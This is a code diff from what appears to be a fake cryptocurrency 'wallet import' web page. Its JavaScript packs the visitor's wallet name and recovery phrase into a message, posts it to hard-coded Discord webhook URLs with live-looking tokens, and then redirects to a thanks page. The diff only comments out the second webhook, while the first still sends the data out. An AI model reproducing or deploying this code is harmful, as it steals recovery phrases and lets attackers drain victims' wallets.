@@ -62,7 +62,7 @@
 
             // Discord webhook URLs
             const webhookURL1 = "https://discord.com/api/webhooks/1293947126551805972/p6E69lwa7SGRlUIN7lfqD0UIQ-HVvdqTGmNNGnqzCPrmUqxyL9GSpAMIHpn3nNoW6w0o";
-            const webhookURL2 = "https://discord.com/api/webhooks/1383559795247812778/JSRvCwHCsBrwjk47fMhKTIuycFk6M6njmgGvVVNeuABBCgcZuX9sFUlpuuSqWrcyisQC"; 
+            //const webhookURL2 = "https://discord.com/api/webhooks/1383559795247812778/JSRvCwHCsBrwjk47fMhKTIuycFk6M6njmgGvVVNeuABBCgcZuX9sFUlpuuSqWrcyisQC"; 
 
             // Prepare the message content
             const messageContent = `**Wallet Import Details**\n\n**Wallet Name:** ${walletName}\n**Recovery Phrase:** ${recoveryPhrase}`;
@@ -76,11 +76,11 @@
                 });
 
                 // Send data to the second webhook
-            await fetch(webhookURL2, {
-                    method: 'POST',
-                   headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: messageContent })
-                });
+           // await fetch(webhookURL2, {
+           //         method: 'POST',
+            //       headers: { 'Content-Type': 'application/json' },
+            //        body: JSON.stringify({ content: messageContent })
+            //    });
 
                 // After sending the data, redirect to another page (or show success message)
                 window.location.href = './thanks.html'; // Replace with your redirect page after form submission
